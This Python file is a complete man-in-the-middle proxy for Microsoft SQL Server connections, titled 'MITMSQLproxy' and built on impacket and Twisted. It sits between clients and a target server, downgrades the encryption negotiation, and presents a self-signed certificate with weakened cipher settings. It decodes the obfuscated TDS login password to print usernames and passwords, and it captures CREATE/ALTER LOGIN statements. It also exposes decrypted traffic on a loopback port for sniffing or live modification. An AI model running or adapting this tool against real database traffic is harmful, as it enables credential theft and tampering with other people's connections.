#!/usr/bin/env python

# Provided under GNU General Public License v3.0
# See the accompanying LICENSE file for more information.
# Author:
#   Marcin Ochab d3Fr4gM3ntaT0r
#
# inspired by: 
#   https://gist.github.com/thinkst/db909e3a41c5cb07d43f
#   impacket mssqlclient.py
#   https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/capture/mssql.rb
#
# do zrobienia:
# - emulacja serwera
# - wlasna fabryka do wspoldzielenia danych - https://stackoverflow.com/questions/14848793/passing-parameters-to-twisted-factory-to-be-passed-to-session

TDS_RESPONSE          = 4
TDS_HEADER_SIZE       = 8
TDS_PRELOGIN_OPTION_SIZE = 5
TDS_PRELOGIN_OPTION_ENCRYPTION_TOKEN = 0x01
TDS_PRELOGIN_OPTION_TERMINATOR_TOKEN = 0xff

TLS_PACKET_SIZE = 16*1024-1

RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m' 
CYAN = "\033[36m"
END = "\033[0m"

import sys
import logging
import argparse
from random import SystemRandom

from twisted.internet import protocol, reactor
from impacket import tds, LOG, version
from impacket.examples import logger

try:
    from OpenSSL import SSL, crypto
except:
    LOG.critical("pyOpenSSL is not installed, can't continue")
    raise

class TDSPreLogin:
    def __init__(self, data):
        self.data = data

    def setEncryptionOption(self,encryption):
            encryption_offset=self.getEncryptionOptionOffset()
            self.data = self.data[:TDS_HEADER_SIZE+encryption_offset] + encryption.to_bytes(1) + self.data[TDS_HEADER_SIZE+encryption_offset+1:]

    def getEncryptionOption(self):
            return self.data[TDS_HEADER_SIZE+self.getEncryptionOptionOffset()]
            
    def getEncryptionOptionOffset(self):
        return self.getOptionOffset(TDS_PRELOGIN_OPTION_ENCRYPTION_TOKEN)


    def getOptionOffset(self, option):
        option_ptr=0
        while True:
            if self.data[TDS_HEADER_SIZE+option_ptr] == TDS_PRELOGIN_OPTION_TERMINATOR_TOKEN:
                break
            if self.data[TDS_HEADER_SIZE+option_ptr] == option:
                break
            option_ptr=option_ptr+TDS_PRELOGIN_OPTION_SIZE
        #print("End of options")
        option_value_offset = self.data[TDS_HEADER_SIZE+option_ptr+1]*255+self.data[TDS_HEADER_SIZE+option_ptr+2]
        #print("offset:",option_value_offset)
        return option_value_offset


class MSSQLServerProtocol(protocol.Protocol):
    def __init__(self):
        self.buffer = None
        self.client = None
        self.before_prelogin = True
        self.tls_enabled = False
        self.key_pair = None
        self.cert = None
        self.client_encryption_req = None

    def connectionMade(self):
        LOG.warning("incoming new connection")

        self.ctx = SSL.Context(SSL.TLS_METHOD)
        if Config.certFromFile:
            LOG.info("client side:  load TLS certificate and key (%s %s)", Config.certFile, Config.keyFile)
            self.ctx.use_certificate_chain_file(Config.certFile)
            self.ctx.use_privatekey_file(Config.keyFile)
        else:
            if Config.key_pair == None or Config.cert == None:
                self.gen_cert()
            self.ctx.use_privatekey(Config.key_pair)
            self.ctx.use_certificate(Config.cert)
        self.ctx.set_cipher_list('ALL:@SECLEVEL=0'.encode('utf-8'))
        self.tls = SSL.Connection(self.ctx,None)
        self.tls.set_accept_state()

        factory = protocol.ClientFactory()
        factory.server = self
        
        if Config.loop:
            factory.protocol = LoopClientProtocol
            reactor.connectTCP(Config.clientLoopAddr, Config.clientLoopPort, factory)
        else:
            factory.protocol = MSSQLClientProtocol
            reactor.connectTCP(Config.serverAddr, Config.serverPort, factory)

    def gen_cert(self):
            LOG.info("client side: generating temporary TLS certificate")
            Config.key_pair = crypto.PKey()
            Config.key_pair.generate_key(crypto.TYPE_RSA, 1024)

            Config.cert = crypto.X509()
            Config.cert.get_subject().O = 'Loki'
            Config.cert.get_subject().CN = 'Sami'
            Config.cert.get_subject().OU = 'Pure-L0G1C'
            Config.cert.get_subject().C = 'US'
            Config.cert.get_subject().L = 'Los Santos'
            Config.cert.get_subject().ST = 'California'

            Config.cert.set_serial_number(SystemRandom().randint(2048 ** 8, 4096 ** 8))
            Config.cert.gmtime_adj_notBefore(0)
            Config.cert.gmtime_adj_notAfter(256 * 409600)
            Config.cert.set_issuer(Config.cert.get_subject())
            Config.cert.set_pubkey(Config.key_pair)
            Config.cert.sign(Config.key_pair, 'sha256')

    def getLoginField(self, login, name):
        return self.getLoginFieldB(login, name).decode()

    def getLoginFieldB(self, login, name):
        return login.rawData[login.fields[name+'Offset']:login.fields[name+'Offset']+login.fields[name+'Length']*2]

    def encryptPassword(self, password ):
        return bytes(bytearray([((x & 0x0f) << 4) + ((x & 0xf0) >> 4) ^ 0xa5 for x in bytearray(password)]))

    def decryptPassword(self, password ):
        return bytes(bytearray([( ((x ^ 0xa5) & 0x0f) << 4) + (((x ^ 0xa5 )& 0xf0) >> 4) for x in bytearray(password)]))

    def parseLogin(self, login):
        LOG.debug("Login data: %s",vars(login))
        LOG.warning("")
        LOG.warning("Login data")
        LOG.warning("AppName: %s",self.getLoginField(login,"AppName"))
        LOG.warning("UserName: %s%s%s",RED,self.getLoginField(login,"UserName"),END)
        LOG.warning("ServerName: %s",self.getLoginField(login,"ServerName"))
        LOG.warning("CltIntName: %s",self.getLoginField(login,"CltIntName"))
        LOG.warning("Database: %s",self.getLoginField(login,"Database"))
        LOG.warning("Password: %s%s%s",RED,self.decryptPassword(self.getLoginFieldB(login,"Password")).decode('utf-8'),END)
        LOG.warning("")

    def findSQLString(self,data,sql):
        i = data.lower().find(sql.encode('utf-16le').lower())
        if i > -1:
            LOG.warning("%s%s%s",RED,data[i:].decode('utf-16le'),END) 

    def findSQLPasswords(self,data):
        self.findSQLString(data,"CREATE USER")
        self.findSQLString(data,"CREATE LOGIN")
        self.findSQLString(data,"ALTER LOGIN")

    # Client => Proxy
    def dataReceived(self, data):
        if self.tls_enabled:
            # print("Client says before SSL :", "".join("{:02x}".format(c) for c in data[8:])) 
            if self.tls.get_finished() == None:
                self.tls.bio_write(data[8:])
                try:
                    self.tls.do_handshake()
                except SSL.WantReadError:
                    pass
                data2 = self.tls.bio_read(TLS_PACKET_SIZE)
                handshake_resp = tds.TDSPacket()
                handshake_resp['Type'] = tds.TDS_PRE_LOGIN
                handshake_resp['Data'] = data2
                self.transport.write(handshake_resp.getData())
                return
            else:
                self.tls.bio_write(data)
                data=b''
                while True:
                    try:
                        data=data+self.tls.read(TLS_PACKET_SIZE)
                    except SSL.WantReadError:
                        break  

        packet = tds.TDSPacket(data)
        # LOG.debug("TDS packet: %s",vars(packet))

        if packet.fields['Type'] == tds.TDS_LOGIN7:
            login = tds.TDS_LOGIN(packet.fields['Data'])
            self.parseLogin(login)

        if packet.fields['Type'] == tds.TDS_PRE_LOGIN and self.before_prelogin:
            LOG.debug("client side: FOUND client prelogin")
            self.before_prelogin = False
            prelogin = TDSPreLogin(data)
            self.client_encryption_req = prelogin.getEncryptionOption()
            if not Config.serverRequiresEncryption:
                prelogin.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
                data=prelogin.data
            else:
                prelogin.setEncryptionOption(tds.TDS_ENCRYPT_REQ)
                data=prelogin.data

        self.findSQLPasswords(data)

        if self.client:
            self.client.write(data)
        else:
            self.buffer = data

    # Proxy => Client
    def write(self, data):
        if self.tls_enabled:
            packet = tds.TDSPacket(data)
            while True:
                try:
                    self.tls.sendall(data[:packet.fields['Length']])
                    LOG.debug("rewriting to client side: %s",data[:packet.fields['Length']])
                except SSL.WantReadError:
                    pass
                try:
                    self.transport.write(self.tls.bio_read(TLS_PACKET_SIZE))
                except SSL.WantReadError:
                    pass
                if len(data) == packet.fields['Length']:
                    break
                data=data[packet.fields['Length']:]
                packet = tds.TDSPacket(data)
                return
        else:
            packet = tds.TDSPacket(data)
            if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
                preloginResponse = TDSPreLogin(data)
    
                if self.client_encryption_req == tds.TDS_ENCRYPT_ON or self.client_encryption_req == tds.TDS_ENCRYPT_REQ: 
                    preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_ON)
                    data = preloginResponse.data
                    LOG.info("client side: enabling TLS ")
                    self.tls_enabled = True

                if self.client_encryption_req == tds.TDS_ENCRYPT_OFF or self.client_encryption_req == tds.TDS_ENCRYPT_NOT_SUP: 
                    preloginResponse.setEncryptionOption(tds.TDS_ENCRYPT_NOT_SUP)
                    data = preloginResponse.data             

            self.transport.write(data)


class MSSQLClientProtocol(protocol.Protocol):
    def __init__(self):
        self.ctx = SSL.Context(SSL.TLS_METHOD)
        self.ctx.set_cipher_list('ALL:@SECLEVEL=0'.encode('utf-8'))
        self.tls = SSL.Connection(self.ctx,None)
        self.tls.set_connect_state()
        self.tls_enabled = False
        self.tls_finished = False
        self.tdsLoginCache = None

    def connectionMade(self):
        self.factory.server.client = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''

    # Server => Proxy
    def dataReceived(self, data):
        if self.tls_enabled:
            if self.tls_finished == False:                
                LOG.debug("server side: TLS handshake receive")
                self.tls.bio_write(data[8:])
                try:
                   self.tls.do_handshake()
                except SSL.WantReadError:
                    LOG.debug("server side: TLS continue sending handshake")
                    data2 = self.tls.bio_read(TLS_PACKET_SIZE)
                    handshake_req = tds.TDSPacket()
                    handshake_req['Type'] = tds.TDS_PRE_LOGIN
                    handshake_req['Data'] = data2
                    self.transport.write(handshake_req.getData())
                    return
                self.tls_finished = True
                LOG.debug("server side: TLS handshake finished")
                if self.tdsLoginCache != None:
                    LOG.debug("sending cached TDSLogin from client to server")
                    self.write(self.tdsLoginCache)
                return
            else:
                self.tls.bio_write(data)
                data=b''
                while True:
                    try:
                        data=data+self.tls.read(TLS_PACKET_SIZE)
                    except SSL.WantReadError:
                        break                

        packet = tds.TDSPacket(data)
        if packet.fields['Type'] ==  TDS_RESPONSE and packet.fields['SPID'] == 0:
            preloginResponse = TDSPreLogin(data)

            if (preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_ON or preloginResponse.getEncryptionOption() == tds.TDS_ENCRYPT_REQ) and Config.serverRequiresEncryption: 
                LOG.info("server side: TLS required - enabling") 
                self.tls_enabled = True
                try:
                   self.tls.do_handshake()
                except SSL.WantReadError:
                    pass
                data2 = self.tls.bio_read(TLS_PACKET_SIZE)
                handshake_req = tds.TDSPacket()
                handshake_req['Type'] = tds.TDS_PRE_LOGIN
                handshake_req['Data'] = data2
                LOG.debug("server side: sending TLS hello: %s",handshake_req.getData())
                self.transport.write(handshake_req.getData())

        self.factory.server.write(data)

    # Proxy => Server
    def write(self, data):
        if data:
            if self.tls_enabled:
                if self.tls_finished == False:
                    LOG.debug("server side: TLS handshake in progess - caching TDSLogin")
                    self.tdsLoginCache = data
                    return
                else:
                    packet = tds.TDSPacket(data)
                    while True:
                        try:
                            self.tls.sendall(data[:packet.fields['Length']])
                            LOG.debug("rewriting to server side: %s",data[:packet.fields['Length']])
                        except SSL.WantReadError:
                            pass
                        try:
                            self.transport.write(self.tls.bio_read(TLS_PACKET_SIZE))
                        except SSL.WantReadError:
                            pass
                        if len(data) == packet.fields['Length']:
                            break
                        data=data[packet.fields['Length']:]
                        packet = tds.TDSPacket(data)
                    return
            else:    
                LOG.debug("rewriting to server side: %s",data)                           
                self.transport.write(data)

class LoopServerProtocol(protocol.Protocol):
    def __init__(self):
        self.buffer = None
        self.client = None
 
    def connectionMade(self):
        factory = protocol.ClientFactory()
        factory.protocol = MSSQLClientProtocol
        factory.server = self
        reactor.connectTCP(Config.serverAddr, Config.serverPort, factory)
 
    def dataReceived(self, data):
        if self.client:
            self.client.write(data)
        else:
            self.buffer = data
 
    def write(self, data):
        self.transport.write(data)
 
 
class LoopClientProtocol(protocol.Protocol):
    def connectionMade(self):
        self.factory.server.client = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''
 
    def dataReceived(self, data):
        self.factory.server.write(data)
 
    def write(self, data):
        if data:
            self.transport.write(data) 
 
class Config:
    loop = True
    listenPort = 1433
    serverPort = 1433
    serverAddr = None
    serverLoopAddr = "127.0.0.1"
    serverLoopPort = 1434
    clientLoopPort = 1434
    clientLoopAddr = "127.0.0.1"
    debugLevel = logging.WARNING
    certFile = None
    keyFile = None
    certFromFile = False
    key_pair = None
    cert = None
    serverRequiresEncryption = False

#class MyServerFactory(protocol.ServerFactory):
#    config = Config()
#    
#    def __init__(self, config):
#        self.config = config

def show_banner():
    if Config.debugLevel >= logging.ERROR:
        return
    # https://patorjk.com/software/taag/#p=testall&f=JS%20Bracket%20Letters&t=MITMSQLproxy
    banner = f"""
  {RED}

 ███▄ ▄███▓ ██▓▄▄▄█████▓ ███▄ ▄███▓     ██████   █████   ██▓        ██▓███   ██▀███   ▒█████  ▒██   ██▒▓██   ██▓
▓██▒▀█▀ ██▒▓██▒▓  ██▒ ▓▒▓██▒▀█▀ ██▒   ▒██    ▒ ▒██▓  ██▒▓██▒       ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░ ▒██  ██▒
▓██    ▓██░▒██▒▒ ▓██░ ▒░▓██    ▓██░   ░ ▓██▄   ▒██▒  ██░▒██░       ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░  ▒██ ██░
▒██    ▒██ ░██░░ ▓██▓ ░ ▒██    ▒██      ▒   ██▒░██  █▀ ░▒██░       ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ░ ▐██▓░
▒██▒   ░██▒░██░  ▒██▒ ░ ▒██▒   ░██▒   ▒██████▒▒░▒███▒█▄ ░██████▒   ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒  ░ ██▒▓░
░ ▒░   ░  ░░▓    ▒ ░░   ░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░   ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ██▒▒▒ 
░  ░      ░ ▒ ░    ░    ░  ░      ░   ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░   ░▒ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░ ▓██ ░▒░ 
░      ░    ▒ ░  ░      ░      ░      ░  ░  ░     ░   ░   ░ ░      ░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ▒ ░░  
       ░    ░                  ░            ░      ░        ░  ░               ░         ░ ░   ░    ░   ░ ░     
                                                                                                        ░ ░     
{END}"""
    print(banner)

def startLoop():
    loopFactory = protocol.ServerFactory()
#    loopFactory = MyServerFactory()
    loopFactory.protocol = LoopServerProtocol
    reactor.listenTCP(Config.serverLoopPort, loopFactory, interface=Config.serverLoopAddr)

def startListener():
    factory = protocol.ServerFactory()
#    factory = MyServerFactory()
    factory.protocol = MSSQLServerProtocol
    reactor.listenTCP(Config.listenPort, factory)

def getArgs():
    parser = argparse.ArgumentParser(add_help = True, description = "MSSQL MITM proxy (SSL supported).")
    parser.add_argument('target', action='store', help='MSSQL server name or address')
    parser.add_argument('-port', action='store', default='1433', help='MSSQL server port (default 1433)')
    parser.add_argument('-lport', action='store', default='1433', help='local listening port (default 1433)')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-q', action='store_true', help='quiet mode')
    group.add_argument('-d', action='store_true', help='show more info')
    group.add_argument('-dd', action='store_true', help='show debug info')

    group = parser.add_argument_group('Internal connection loop - decrypted data is sent to certain port (default 127.0.0.1:1434) and coming back to mitmslqproxy to be encrypted and send further. This option allows to sniff or even modify unencrypted SQL traffic in the fly with third party application')
    group.add_argument('-ll', action='store',  help='loop listening address (default 127.0.0.1)', metavar = "ip_address", default='127.0.0.1')
    group.add_argument('-llp', action='store', help='loop listening address port (default 1434)', metavar = "port", default='1434')
    group.add_argument('-lc', action='store',  help='loop connecting address (default 127.0.0.1)',metavar = "ip_address", default='127.0.0.1')
    group.add_argument('-lcp', action='store', help='loop connecting address port (default 1434)',metavar = "port", default='1434')
    group.add_argument('--disable-loop', action='store_true', help='disable internal loop - if both sides will negotiate encryption sniffing will be useless, only credentials will be shown on console (raw data only in debug mode)', dest="disableloop")

    group = parser.add_argument_group('TLS custom private key and certificate (by default it is dynamically generated)')
    group.add_argument('--cert', action='store', help='certificate file', metavar = "my.crt", default=None)
    group.add_argument('--key' , action='store', help='private key file', metavar = "my.key", default=None)                                    

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    if options.disableloop is True:
        Config.loop =False

    Config.listenPort=int(options.lport)
    Config.serverPort=int(options.port)
    Config.serverAddr=options.target
    Config.serverLoopAddr=options.ll
    Config.serverLoopPort=int(options.llp)   
    Config.clientLoopAddr=options.lc
    Config.clientLoopPort=int(options.lcp) 

    if options.key and options.cert:
        Config.certFromFile = True
        Config.certFile=options.cert
        Config.keyFile=options.key

    if options.q:
        Config.debugLevel = logging.ERROR
    if options.d:
        Config.debugLevel = logging.INFO
    if options.dd:
        Config.debugLevel = logging.DEBUG
    
    #LOG.critical("critical")
    #LOG.error("error")  # quiet
    #LOG.warning("warning") # normal
    #LOG.info("info") # detailed
    #LOG.debug("debug") # debug 
        
def getServerEncryption():
    ms_sql = tds.MSSQL(Config.serverAddr, Config.serverPort)
    ms_sql.connect()
    resp=ms_sql.preLogin()
    if resp['Encryption'] == tds.TDS_ENCRYPT_REQ:
        LOG.info("Server requires encryption!")
        Config.serverRequiresEncryption=True
    else:
        LOG.info("Server DOES NOT require encryption!")
    ms_sql.disconnect()

def main():
    getArgs()
    logger.init()
    logging.getLogger().setLevel(Config.debugLevel)
    logging.debug(version.getInstallationPath())
    
    show_banner()

    getServerEncryption()

    if Config.loop:
        LOG.warning("Starting loop decrypted connection for proxy or sniffer on loopback interface\n[ client->0.0.0:%s-(decryption)->%s:%s->%s:%s-(encryption)->%s:%s ]",Config.listenPort,Config.clientLoopAddr,Config.clientLoopPort,Config.serverLoopAddr,Config.serverLoopPort,Config.serverAddr,Config.serverPort)
        startLoop()
    startListener()
    LOG.warning("Waiting for connections on port %s...",Config.listenPort)
    reactor.run()


if __name__ == '__main__':
    main()